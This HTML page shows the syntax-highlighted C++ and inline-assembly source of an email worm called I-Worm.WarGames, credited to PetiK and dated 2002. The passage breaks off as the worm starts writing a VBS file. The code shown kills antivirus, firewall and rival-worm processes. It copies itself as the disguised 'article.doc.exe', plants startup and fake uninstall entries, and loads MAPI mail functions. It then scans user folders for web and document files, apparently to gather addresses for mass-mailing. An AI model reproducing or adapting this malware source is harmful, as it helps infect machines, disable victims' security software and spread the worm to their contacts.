<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Wargam - wargames.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
Name : I-Worm.WarGames
Author : PetiK
Date : February 12th 2002 - February 22th 2002
Language : C++/Win32asm
*/</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;mapi.h&gt;
#include &lt;tlhelp32.h&gt;
#pragma argused
#pragma inline
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">sysdir</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">copyr</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">]=</span><span class="sc6">"w"</span><span class="sc10">,</span><span class="sc11">winhtm</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">],</span><span class="sc11">subj</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc10">,</span><span class="sc11">counter</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc10">*</span><span class="sc11">alph</span><span class="sc10">[]={</span><span class="sc6">"a"</span><span class="sc10">,</span><span class="sc6">"b"</span><span class="sc10">,</span><span class="sc6">"c"</span><span class="sc10">,</span><span class="sc6">"d"</span><span class="sc10">,</span><span class="sc6">"e"</span><span class="sc10">,</span><span class="sc6">"f"</span><span class="sc10">,</span><span class="sc6">"g"</span><span class="sc10">,</span><span class="sc6">"h"</span><span class="sc10">,</span><span class="sc6">"i"</span><span class="sc10">,</span><span class="sc6">"j"</span><span class="sc10">,</span><span class="sc6">"k"</span><span class="sc10">,</span><span class="sc6">"l"</span><span class="sc10">,</span><span class="sc6">"m"</span><span class="sc10">,</span><span class="sc0">
         </span><span class="sc6">"n"</span><span class="sc10">,</span><span class="sc6">"o"</span><span class="sc10">,</span><span class="sc6">"p"</span><span class="sc10">,</span><span class="sc6">"q"</span><span class="sc10">,</span><span class="sc6">"r"</span><span class="sc10">,</span><span class="sc6">"s"</span><span class="sc10">,</span><span class="sc6">"t"</span><span class="sc10">,</span><span class="sc6">"u"</span><span class="sc10">,</span><span class="sc6">"v"</span><span class="sc10">,</span><span class="sc6">"w"</span><span class="sc10">,</span><span class="sc6">"x"</span><span class="sc10">,</span><span class="sc6">"y"</span><span class="sc10">,</span><span class="sc6">"z"</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">dn</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">]=</span><span class="sc6">"Wargames Uninstall"</span><span class="sc10">,</span><span class="sc11">ust</span><span class="sc10">[</span><span class="sc4">40</span><span class="sc10">]=</span><span class="sc6">"rundll32 mouse,disable"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">LPSTR</span><span class="sc0">   </span><span class="sc11">SHFolder</span><span class="sc10">=</span><span class="sc6">".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BYTE</span><span class="sc0">    </span><span class="sc11">desktop</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">favoris</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">personal</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">cache</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">page</span><span class="sc10">[</span><span class="sc4">150</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0">   </span><span class="sc11">sizcache</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">desktop</span><span class="sc10">),</span><span class="sc11">sizfavoris</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">favoris</span><span class="sc10">),</span><span class="sc0">
    </span><span class="sc11">sizpersonal</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">personal</span><span class="sc10">),</span><span class="sc11">sizdesktop</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">cache</span><span class="sc10">),</span><span class="sc11">spage</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">page</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0">   </span><span class="sc11">type</span><span class="sc10">=</span><span class="sc11">REG_SZ</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0">    </span><span class="sc10">*</span><span class="sc11">vbsworm</span><span class="sc10">,*</span><span class="sc11">winstart</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0">  </span><span class="sc11">lSnapshot</span><span class="sc10">,</span><span class="sc11">myproc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0">    </span><span class="sc11">rProcessFound</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">LHANDLE</span><span class="sc0"> </span><span class="sc11">session</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc11">mess</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiMessage</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mes</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">messId</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">],</span><span class="sc11">mname</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc11">maddr</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hMAPI</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0">     </span><span class="sc11">ffile</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">PROCESSENTRY32</span><span class="sc0">      </span><span class="sc11">uProcess</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0">            </span><span class="sc11">hReg</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0">      </span><span class="sc11">wartime</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">sendmail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">

</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mSendMail</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MapiMessage</span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mLogoff</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mLogon</span><span class="sc10">)(</span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPLHANDLE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mFindNext</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mReadMail</span><span class="sc10">)(</span><span class="sc11">LHANDLE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPTSTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FLAGS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ULONG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lpMapiMessage</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc11">ULONG</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PASCAL</span><span class="sc0"> </span><span class="sc11">FAR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mFreeBuffer</span><span class="sc10">)(</span><span class="sc11">LPVOID</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrev</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc2">// Kill Some AntiVirus
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"AVP32.EXE"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// AVP
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"AVPCC.EXE"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// AVP
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"AVPM.EXE"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// AVP
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"WFINDV32.EXE"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// Dr. Solomon
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"F-AGNT95.EXE"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// F-Secure
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"NAVAPW32.EXE"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// Norton Antivirus
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"NAVW32.EXE"</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// Norton Antivirus
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"NMAIN.EXE"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// Norton Antivirus
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"PAVSCHED.EXE"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// Panda AntiVirus
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"ZONEALARM.EXE"</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// ZoneAlarm
</span><span class="sc0">
</span><span class="sc2">// Kill Some Worm
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"KERN32.EXE"</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// I-Worm.Badtrans
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"SETUP.EXE"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// I-Worm.Cholera
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"RUNDLLW32.EXE"</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// I-Worm.Gift
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"GONER.SCR"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// I-Worm.Goner
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"LOAD.EXE"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc2">// I-Worm.Nimda
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"INETD.EXE"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// I-Worm.Plage - BadTrans
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"FILES32.VXD"</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">// I-Worm.PrettyPark
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"SCAM32.EXE"</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// I-Worm.Sircam
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"GDI32.EXE"</span><span class="sc10">);</span><span class="sc0">        </span><span class="sc2">// I-Worm.Sonic
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"_SETUP.EXE"</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc2">// I-Worm.ZippedFiles
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"EXPLORE.EXE"</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc2">// I-Worm.ZippedFiles
</span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc6">"ZIPPED_FILES.EXE"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// I-Worm.ZippedFiles
</span><span class="sc0">
</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hInst</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">GetSystemDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">sysdir</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">SetCurrentDirectory</span><span class="sc10">(</span><span class="sc11">sysdir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc6">"article.doc.exe"</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\WarGames Worm"</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"DisplayName"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">dn</span><span class="sc10">,</span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"UninstallString"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">ust</span><span class="sc10">,</span><span class="sc4">40</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">randomize</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">num</span><span class="sc10">=</span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">randname</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">copyr</span><span class="sc10">,</span><span class="sc11">alph</span><span class="sc10">[</span><span class="sc11">GetTickCount</span><span class="sc10">()%</span><span class="sc4">25</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(++</span><span class="sc11">counter</span><span class="sc10">==</span><span class="sc11">num</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">copyr</span><span class="sc10">,</span><span class="sc6">".exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">copyr</span><span class="sc10">,</span><span class="sc6">"New Copy Name:"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">|</span><span class="sc11">MB_ICONINFORMATION</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc11">copyr</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteProfileString</span><span class="sc10">(</span><span class="sc6">"WINDOWS"</span><span class="sc10">,</span><span class="sc6">"RUN"</span><span class="sc10">,</span><span class="sc11">copyr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WritePrivateProfileString</span><span class="sc10">(</span><span class="sc6">"rename"</span><span class="sc10">,</span><span class="sc6">"NUL"</span><span class="sc10">,</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc6">"WININIT.INI"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">endrandname</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc11">GetTickCount</span><span class="sc10">()%</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">randname</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">endrandname</span><span class="sc10">:</span><span class="sc0">

</span><span class="sc11">hMAPI</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mSendMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_USERS</span><span class="sc10">,</span><span class="sc11">SHFolder</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"Desktop"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc11">desktop</span><span class="sc10">,&amp;</span><span class="sc11">sizdesktop</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"Favorites"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc11">favoris</span><span class="sc10">,&amp;</span><span class="sc11">sizfavoris</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"Personal"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc11">personal</span><span class="sc10">,&amp;</span><span class="sc11">sizpersonal</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">,</span><span class="sc6">"Cache"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc11">cache</span><span class="sc10">,&amp;</span><span class="sc11">sizcache</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hReg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">GetWindowsDirectory</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">winhtm</span><span class="sc10">,</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">_asm</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">call</span><span class="sc0">    </span><span class="sc11">@wininet</span><span class="sc0">
</span><span class="sc11">db</span><span class="sc0">  </span><span class="sc6">"WININET.DLL"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc0">
</span><span class="sc11">@wininet</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">call</span><span class="sc0">    </span><span class="sc11">LoadLibrary</span><span class="sc0">
</span><span class="sc11">test</span><span class="sc0">    </span><span class="sc11">eax</span><span class="sc10">,</span><span class="sc11">eax</span><span class="sc0">
</span><span class="sc11">jz</span><span class="sc0">  </span><span class="sc11">end_asm</span><span class="sc0">
</span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">ebp</span><span class="sc10">,</span><span class="sc11">eax</span><span class="sc0">
</span><span class="sc11">call</span><span class="sc0">    </span><span class="sc11">@inetconnect</span><span class="sc0">
</span><span class="sc11">db</span><span class="sc0">  </span><span class="sc6">"InternetGetConnectedState"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc0">
</span><span class="sc11">@inetconnect</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">push</span><span class="sc0">    </span><span class="sc11">ebp</span><span class="sc0">
</span><span class="sc11">call</span><span class="sc0">    </span><span class="sc11">GetProcAddress</span><span class="sc0">
</span><span class="sc11">test</span><span class="sc0">    </span><span class="sc11">eax</span><span class="sc10">,</span><span class="sc11">eax</span><span class="sc0">
</span><span class="sc11">jz</span><span class="sc0">  </span><span class="sc11">end_wininet</span><span class="sc0">
</span><span class="sc11">mov</span><span class="sc0"> </span><span class="sc11">edi</span><span class="sc10">,</span><span class="sc11">eax</span><span class="sc0">
</span><span class="sc11">verf</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">push</span><span class="sc0">    </span><span class="sc4">0</span><span class="sc0">
</span><span class="sc11">push</span><span class="sc0">    </span><span class="sc11">Tmp</span><span class="sc0">
</span><span class="sc11">call</span><span class="sc0">    </span><span class="sc11">edi</span><span class="sc0">
</span><span class="sc11">dec</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc0">
</span><span class="sc11">jnz</span><span class="sc0"> </span><span class="sc11">verf</span><span class="sc0">

</span><span class="sc11">end_wininet</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">push</span><span class="sc0">    </span><span class="sc11">ebp</span><span class="sc0">
</span><span class="sc11">call</span><span class="sc0">    </span><span class="sc11">FreeLibrary</span><span class="sc0">
</span><span class="sc11">end_asm</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc11">end_all_asm</span><span class="sc0">

</span><span class="sc11">Tmp</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">

</span><span class="sc11">end_all_asm</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">desktop</span><span class="sc10">,</span><span class="sc6">"*.htm"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">desktop</span><span class="sc10">,</span><span class="sc6">"*.doc"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">favoris</span><span class="sc10">,</span><span class="sc6">"*.ht*"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">personal</span><span class="sc10">,</span><span class="sc6">"*.ht*"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">personal</span><span class="sc10">,</span><span class="sc6">"*.doc"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">personal</span><span class="sc10">,</span><span class="sc6">"*.xls"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">personal</span><span class="sc10">,</span><span class="sc6">"*.asp"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">cache</span><span class="sc10">,</span><span class="sc6">".ht*"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">cache</span><span class="sc10">,</span><span class="sc6">".php"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">cache</span><span class="sc10">,</span><span class="sc6">".asp"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">winhtm</span><span class="sc10">,</span><span class="sc6">".ht*"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc11">winhtm</span><span class="sc10">,</span><span class="sc6">".doc"</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc11">vbsworm</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc6">"wargames.vbs"</span><span class="sc10">,</span><span class="sc6">"w"</span><span class="sc10">);</span><span class="sc0">
